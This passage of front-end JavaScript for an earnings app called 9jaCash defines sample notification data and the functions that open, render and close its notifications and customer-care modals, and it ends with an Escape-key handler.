  initDarkMode();
  initFirebase();
  renderUserInfo();
  renderBankInfo();
  updateBalance();
  initCheckin();
  initClaim();
  initReferrals();
  renderActivities();
  checkPendingBounceOnLoad();
  checkAndShowVerifyButton();
  setupRealtimeListener();
  loadTelegramConfig();
  initTutorial();
  startLiveWithdrawalPopups();
  initSocialPopup();
});

// Sample Notifications Data Array
let userNotifications = [
  {
    id: 1,
    title: "Welcome to 9jaCash!",
    desc: "Start mining daily to earn rewards and build up your balance.",
    time: "2 mins ago",
    read: false
  },
  {
    id: 2,
    title: "Daily Check-In Ready",
    desc: "Don't forget to claim your daily check-in streak reward.",
    time: "1 hour ago",
    read: false
  }
];

/* ===================================================
   1. NOTIFICATIONS MODAL FUNCTIONS
   =================================================== */

function openNotificationsModal() {
  const modal = document.getElementById('notificationsOverlay');
  if (modal) {
    renderNotifications();
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
  }
}

function closeNotificationsModal(event) {
  if (event && event.target !== event.currentTarget) return;
  const modal = document.getElementById('notificationsOverlay');
  if (modal) {
    modal.classList.remove('active');
    document.body.style.overflow = '';
  }
}

function updateBellDot() {
  const dot = document.getElementById('bellDot');
  if (dot) dot.style.display = userNotifications.some(n => !n.read) ? 'block' : 'none';
}

function renderNotifications() {
  updateBellDot();
  const container = document.getElementById('notificationsList');
  const badge = document.getElementById('modalNotifBadge');
  if (!container) return;

  const unreadCount = userNotifications.filter(n => !n.read).length;
  if (badge) {
    if (unreadCount > 0) {
      badge.textContent = unreadCount;
      badge.classList.remove('hidden');
    } else {
      badge.classList.add('hidden');
    }
  }

  if (userNotifications.length === 0) {
    container.innerHTML = `
      <div style="text-align:center; padding: 24px 0; color: #94a3b8; font-size: 13px;">
        <i class="fa-solid fa-bell-slash" style="font-size:24px; margin-bottom:8px;"></i>
        <p>No notifications yet</p>
      </div>`;
    return;
  }

  container.innerHTML = userNotifications.map(n => `
    <div class="notif-item ${!n.read ? 'unread' : ''}">
      <div style="width: 32px; height: 32px; border-radius: 10px; background: rgba(99, 102, 241, 0.1); color: #6366f1; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
        <i class="fa-solid fa-bell" style="font-size: 12px;"></i>
      </div>
      <div style="flex: 1;">
        <div class="notif-title">${n.title}</div>
        <div class="notif-desc">${n.desc}</div>
        <div class="notif-time">${n.time}</div>
      </div>
    </div>
  `).join('');
}

function markAllNotificationsAsRead() {
  userNotifications.forEach(n => n.read = true);
  renderNotifications();
  updateBellDot();
  if (typeof showToast === 'function') {
    showToast('All notifications marked as read');
  }
}

/* ===================================================
   2. CUSTOMER CARE MODAL FUNCTIONS
   =================================================== */

function openCustomerCareModal() {
  const modal = document.getElementById('customerCareModal');
  if (modal) {
    updateCustomerCareLinks();
    modal.classList.add('show');
  }
}

function closeCustomerCareModal(event) {
  if (event && event.target !== event.currentTarget) return;
  const modal = document.getElementById('customerCareModal');
  if (modal) {
    modal.classList.remove('show');
  }
}

// Close modals on Escape key press
document.addEventListener('DOMContentLoaded', updateBellDot);

document.addEventListener('keydown', function (e) {
  if (e.key === 'Escape') {
    closeNotificationsModal();
    closeCustomerCareModal();
  }
});
